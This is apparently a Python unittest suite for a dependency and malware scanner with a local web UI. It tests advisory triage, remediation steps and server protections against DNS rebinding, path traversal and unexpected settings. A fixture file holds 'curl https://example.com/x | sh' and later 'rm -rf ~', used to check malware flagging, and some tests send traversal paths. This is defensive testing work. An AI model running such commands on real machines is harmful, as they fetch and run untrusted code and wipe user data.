import http.client
import json
import os
import tempfile
import time
import unittest
from unittest import mock

from scs import history
from scs.analyze import build_findings
from scs.models import Advisory, Package
from scs.ui import server
from scs.ui import viewmodel as vm


def scan_result():
    pk = [Package("PyPI", "requests", "2.19.0", "pip", "/e/lib/python3.10/site-packages",
                  meta={"env": "/Users/x/.pyenv/versions/3.10.3", "python": "/e/bin/python"}),
          Package("npm", "chalk", "5.6.1", "lockfile", "/p/package-lock.json", meta={"project": "/p", "lockfile": "package-lock.json"}),
          Package("npm", "left-pad", "1.0.0", "lockfile", "/p/package-lock.json", meta={"project": "/p", "lockfile": "package-lock.json"})]
    advs = {pk[0].key: [Advisory("GHSA-x", aliases=["CVE-2018-18074"], severity="HIGH", fixed=["2.20.0"])],
            pk[1].key: [Advisory("MAL-1", malicious=True, severity="CRITICAL")],
            pk[2].key: [Advisory("GHSA-l", severity="LOW")]}
    findings, _ = build_findings(pk, advs, [])
    from scs.analyze import summarize
    return {"host": "testhost", "started": "2026-10-26T10:00:00+07:00", "duration_s": 1, "scs_version": "t",
            "summary": summarize(findings), "findings": [f.to_dict() for f in findings], "inventory": {"total": 3, "unique": 3},
            "sources": {}, "collectors": {}, "errors": [], "config": {}, "outdated": [], "has_previous": False}


class ViewModelTests(unittest.TestCase):
    def test_plain_language(self):
        items = {i["name"]: i for i in (vm.plain_finding(f) for f in scan_result()["findings"])}
        self.assertEqual(items["requests"]["headline"], "Update requests from 2.19.0 to 2.20.0")
        self.assertEqual(items["requests"]["group"], "update")
        self.assertEqual(items["requests"]["where"], ["Python 3.10.3 (pyenv)"])
        self.assertEqual(items["chalk"]["group"], "act")
        self.assertIn("malicious", items["chalk"]["headline"])
        self.assertEqual(items["left-pad"]["group"], "wait")
        self.assertEqual(items["requests"]["details"]["advisories"][0]["link"], "https://osv.dev/vulnerability/GHSA-x")
        self.assertEqual(vm.eco_label("Ubuntu:24.04:LTS"), "System package (Ubuntu 24.04 LTS)")

    def test_health(self):
        s = scan_result()
        self.assertEqual(vm.health(None, None)["level"], "unknown")
        self.assertEqual(vm.health(s, None)["level"], "act")
        s["summary"]["buckets"]["respond"] = 0
        s["summary"]["severity"]["CRITICAL"] = 0
        s["findings"] = [f for f in s["findings"] if f["bucket"] != "respond"]
        self.assertEqual(vm.health(s, None)["headline"], "Updates recommended")
        self.assertEqual(vm.health(s, {"counts": {"critical": 1}})["level"], "act")


class ManualStepTests(unittest.TestCase):
    def finding(self, **kw):
        f = {"bucket": "monitor", "ecosystem": "PyPI", "name": "wheel", "version": "0.37.0", "fix_version": None,
             "reasons": [], "advisories": [{"id": "GHSA-q", "references": []}], "packages": []}
        f.update(kw)
        return f

    def test_apple_python_points_to_vendor_and_user_site(self):
        env = "/Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/Current"
        pkg = {"source": "pip", "meta": {"env": env, "python": env + "/bin/python3.9"}}
        steps = vm.manual_steps(self.finding(fix_version="0.38.1", packages=[pkg]))
        cmds = [s["cmd"] for s in steps]
        self.assertEqual(cmds[0], "softwareupdate --list")
        self.assertIn("-m pip install --user 'wheel>=0.38.1'", cmds[1])
        blocked = vm.manual_steps(self.finding(fix_version="26.2", packages=[pkg], reasons=["26.2 needs python >=3.10, but …"]))
        self.assertFalse(any("--user" in s["cmd"] for s in blocked))  # the fix can't run on that Python

    def test_unfixed_package_steps(self):
        go = [{"source": "lockfile", "meta": {"project": f"/src/{n}", "lockfile": "go.mod"}} for n in ("a", "b")]
        steps = vm.manual_steps(self.finding(ecosystem="Go", name="github.com/x/y", packages=go))
        cmds = [s["cmd"] for s in steps]
        self.assertEqual(sum("go mod why" in c for c in cmds), 2)
        self.assertEqual(sum("go list -m -u" in c for c in cmds), 1)
        self.assertEqual(steps[-1]["link"], "https://osv.dev/vulnerability/GHSA-q")
        pip = [{"source": "pip", "meta": {"env": "/e", "python": "/e/bin/python3"}}]
        self.assertIn("/e/bin/python3 -m pip show wheel", vm.manual_steps(self.finding(packages=pip))[0]["cmd"])
        self.assertEqual(vm.manual_steps(self.finding(bucket="patch", packages=pip)), [])


class ServerTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.env = mock.patch.dict(os.environ, {"XDG_DATA_HOME": self.tmp, "XDG_CACHE_HOME": self.tmp})
        self.env.start()
        self.cfg = mock.patch.object(server, "CONFIG", server.Path(self.tmp) / "config.json")
        self.cfg.start()
        self.httpd, self.app, self.url = server.serve(server.App(folder_picker=lambda: "/picked"))
        self.port = self.httpd.server_port

    def tearDown(self):
        self.httpd.shutdown()
        self.cfg.stop()
        self.env.stop()

    def req(self, method, path, body=None, token=True, host=None):
        c = http.client.HTTPConnection("127.0.0.1", self.port, timeout=10)
        headers = {"Host": host or f"127.0.0.1:{self.port}"}
        if token:
            headers["X-SCS-Token"] = self.app.token
        data = None
        if body is not None:
            data = json.dumps(body)
            headers["Content-Type"] = "application/json"
        c.request(method, path, body=data, headers=headers)
        r = c.getresponse()
        raw = r.read()
        c.close()
        try:
            return r.status, json.loads(raw), dict(r.getheaders())
        except ValueError:
            return r.status, raw, dict(r.getheaders())

    def test_security_boundaries(self):
        st, body, hdr = self.req("GET", "/", token=False)
        self.assertEqual(st, 200)
        self.assertIn("script-src 'self'", hdr["Content-Security-Policy"])
        self.assertEqual(self.req("GET", "/api/status", token=False)[0], 403)
        self.assertEqual(self.req("GET", "/api/status", host="evil.example:80")[0], 403)  # DNS rebinding
        self.assertEqual(self.req("GET", "/../server.py", token=False)[0], 404)
        self.assertEqual(self.req("GET", "/%2e%2e/server.py", token=False)[0], 404)
        st, body, _ = self.req("POST", "/api/open", {"url": "http://example.com"})
        self.assertEqual(st, 400)
        st, body, hdr = self.req("GET", "/api/status")
        self.assertEqual((st, body["health"]["level"]), (200, "unknown"))
        self.assertNotIn("Access-Control-Allow-Origin", hdr)

    def test_findings_triage_plan_and_quarantine_rules(self):
        history.save(scan_result())
        with mock.patch.object(server, "host_id", return_value="testhost"):
            st, body, _ = self.req("GET", "/api/findings")
            self.assertEqual(st, 200)
            keys = {i["name"]: i["key"] for i in body["items"]}
            self.assertEqual(self.req("POST", "/api/triage", {"key": keys["requests"], "action": "ignore"})[0], 400)  # no reason
            self.assertEqual(self.req("POST", "/api/triage", {"key": keys["chalk"], "action": "ignore", "reason": "x"})[0], 400)
            self.assertEqual(self.req("POST", "/api/triage", {"key": keys["requests"], "action": "defer", "days": 7})[0], 200)
            st, body, _ = self.req("GET", "/api/findings")
            req = next(i for i in body["items"] if i["name"] == "requests")
            self.assertEqual(req["decision"]["action"], "defer")
            for days in (0, 366):  # "remind me" is limited to 1 day … 12 months
                self.assertEqual(self.req("POST", "/api/triage", {"key": keys["requests"], "action": "defer", "days": days})[0], 400)
            self.assertEqual(self.req("POST", "/api/triage", {"key": keys["requests"], "action": "defer", "days": 90})[0], 200)
            st, plan, _ = self.req("POST", "/api/plan", {"keys": [keys["requests"]]})
            self.assertEqual(st, 200)
            self.assertEqual(len(plan["targets"]), 1)
            self.assertIn("requests 2.19.0 → 2.20.0", plan["targets"][0]["packages"])
            self.assertEqual(self.req("POST", "/api/quarantine", {"path": "/etc/hosts", "reason": "x"})[0], 400)
            self.assertEqual(self.req("POST", "/api/pick-folder", {})[1], {"path": "/picked"})

    def test_malware_ignore_needs_confirmed_reason_and_can_be_undone(self):
        f = os.path.join(self.tmp, "backup.sh")
        with open(f, "w") as fh:
            fh.write("curl https://example.com/x | sh\n")
        found = [{"check": "persistence", "severity": "high", "title": "launchd: com.me.backup", "path": f,
                  "evidence": ["INLINE_SCRIPT"], "rules": [], "advice": "", "quarantinable": True, "new": False, "meta": {}},
                 {"check": "packages", "severity": "critical", "title": "known malware hash", "path": f,
                  "evidence": [], "rules": [], "advice": "", "quarantinable": True, "new": False, "meta": {}}]
        latest = {"started": "2026-10-27T09:00:00+07:00", "findings": found, "counts": {"critical": 1, "high": 1}}
        with mock.patch.object(server, "_latest_malware", return_value=latest):
            ids = [m["id"] for m in self.req("GET", "/api/malware")[1]["items"]]
            self.assertEqual(self.req("POST", "/api/malware/ignore", {"id": ids[0]})[0], 400)  # no reason
            self.assertEqual(self.req("POST", "/api/malware/ignore", {"id": ids[1], "reason": "x"})[0], 400)  # critical
            self.assertEqual(self.req("POST", "/api/malware/ignore", {"id": ids[0], "reason": "my backup job"})[0], 200)
            body = self.req("GET", "/api/malware")[1]
            self.assertEqual([m["id"] for m in body["items"]], [ids[1]])
            self.assertEqual(body["ignored"][0]["reason"], "my backup job")
            self.assertEqual(body["counts"]["high"], 0)
            with open(f, "a") as fh:  # the file changed: the item shows again
                fh.write("rm -rf ~\n")
            self.assertEqual(len(self.req("GET", "/api/malware")[1]["items"]), 2)
            self.assertEqual(self.req("POST", "/api/malware/unignore", {"id": ids[0]})[0], 200)
            self.assertEqual(self.req("POST", "/api/malware/unignore", {"id": ids[0]})[0], 400)

    def test_settings_roundtrip(self):
        st, body, _ = self.req("POST", "/api/settings", {"roots": [self.tmp, "/definitely/missing"], "alert_min_severity": "medium",
                                                         "evil_key": "x"})
        self.assertEqual(body["config"]["roots"], [self.tmp])  # missing folders dropped
        saved = json.loads((server.Path(self.tmp) / "config.json").read_text())
        self.assertNotIn("evil_key", saved)

    def test_cancel_scan_and_refuse_cancel_of_fixes(self):
        import threading
        started = threading.Event()
        with mock.patch("scs.cli.perform_scan", _slow_scan_factory(started)):
            st, job, _ = self.req("POST", "/api/scan", {})
            self.assertTrue(job["cancellable"])
            started.wait(5)
            self.assertEqual(self.req("POST", f"/api/jobs/{job['id']}/cancel", {})[0], 200)
            for _ in range(50):
                v = self.req("GET", f"/api/jobs/{job['id']}")[1]
                if v["state"] != "running":
                    break
                time.sleep(0.1)
        self.assertEqual(v["state"], "cancelled")
        self.assertLess(v["log_size"], 200)
        fix = self.app.jobs.start("fix", "Fixing", lambda j: time.sleep(0.2))
        self.assertEqual(self.req("POST", f"/api/jobs/{fix.id}/cancel", {})[0], 400)

    def test_fix_safe_ignores_stale_saved_choices(self):
        from scs.policy import Decisions
        r = scan_result()
        r["host"] = "testhost"
        for f in r["findings"]:
            if f["name"] == "requests":
                f["bucket"] = "verify"  # e.g. a newer toolchain check moved it out of "safe"
        history.save(r)
        d = Decisions()
        d.set("PyPI|requests|2.19.0", "patch", ["GHSA-x"])  # stale choice saved by an older version
        d.save()
        captured = {}

        class FakeRunner:
            def __init__(self, plan, path, opts):
                captured["plan"] = plan

            def execute(self, sel):
                return {"targets": []}
        with mock.patch.object(server, "host_id", return_value="testhost"), \
                mock.patch("scs.executor.Runner", FakeRunner), mock.patch("scs.cli.perform_scan", lambda cfg: r):
            st, job, _ = self.req("POST", "/api/fix-safe", {})
            for _ in range(50):
                v = self.req("GET", f"/api/jobs/{job['id']}")[1]
                if v["state"] != "running":
                    break
                time.sleep(0.1)
        self.assertEqual(v["state"], "done", v)
        names = [p["name"] for t in captured["plan"]["targets"] for p in t["packages"]]
        self.assertNotIn("requests", names)
        self.assertEqual(Decisions().data.keys(), {"PyPI|requests|2.19.0"})  # the button wrote no new choices

    def test_job_lifecycle(self):
        def fake_scan(cfg):
            from scs.util import log
            log("collecting…")
            r = scan_result()
            r["host"] = "testhost"
            history.save(r)
            return r
        with mock.patch("scs.cli.perform_scan", fake_scan):
            st, job, _ = self.req("POST", "/api/scan", {})
            self.assertEqual(st, 200)
            for _ in range(50):
                st, v, _ = self.req("GET", f"/api/jobs/{job['id']}")
                if v["state"] != "running":
                    break
                time.sleep(0.1)
        self.assertEqual(v["state"], "done", v)
        self.assertIn("collecting…", v["log"])
        self.assertEqual(v["result"]["summary"]["respond"], 1)


if __name__ == "__main__":
    unittest.main()


class RobustnessTests(unittest.TestCase):
    def test_incomplete_scan_is_never_an_all_clear(self):
        s = scan_result()
        s["findings"], s["summary"]["buckets"] = [], {"respond": 0, "patch": 0, "verify": 0, "monitor": 0}
        s["summary"]["severity"] = {}
        s["sources"] = {"osv": "INCOMPLETE: 390 of 402 advisories could not be downloaded (certificate verify failed)"}
        h = vm.health(s, None)
        self.assertEqual((h["level"], h["headline"]), ("attention", "Scan incomplete"))
        s["sources"] = {"osv": "908 packages queried, 0 advisories"}
        self.assertEqual(vm.health(s, None)["level"], "good")

    def test_ca_fallback_when_python_has_no_certificates(self):
        import ssl
        from scs import util
        empty = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)  # like python.org / frozen builds: no CAs loaded
        with mock.patch.object(util, "_ssl_ctx", None), mock.patch("ssl.create_default_context", return_value=empty):
            ctx = util.ssl_context()
        self.assertGreater(ctx.cert_store_stats()["x509_ca"], 0)

    @unittest.skipIf(os.name == "nt", "PATH recovery is for macOS/Linux GUI launches")
    def test_path_recovered_from_minimal_gui_environment(self):
        from scs.ui import app
        with mock.patch.dict(os.environ, {"PATH": "/usr/bin:/bin"}):
            with mock.patch.object(app, "login_shell_path", return_value=["/opt/custom/bin"]), \
                    mock.patch("os.path.isdir", lambda d: d in ("/opt/custom/bin", "/usr/bin", "/bin", "/opt/homebrew/bin")):
                app.augment_path()
            self.assertEqual(os.environ["PATH"].split(os.pathsep)[:4], ["/opt/custom/bin", "/usr/bin", "/bin", "/opt/homebrew/bin"])




def _slow_scan_factory(started):
    def slow_scan(cfg):
        from scs.util import log
        started.set()
        for i in range(200):
            log(f"step {i}")
            time.sleep(0.02)
        return scan_result()
    return slow_scan
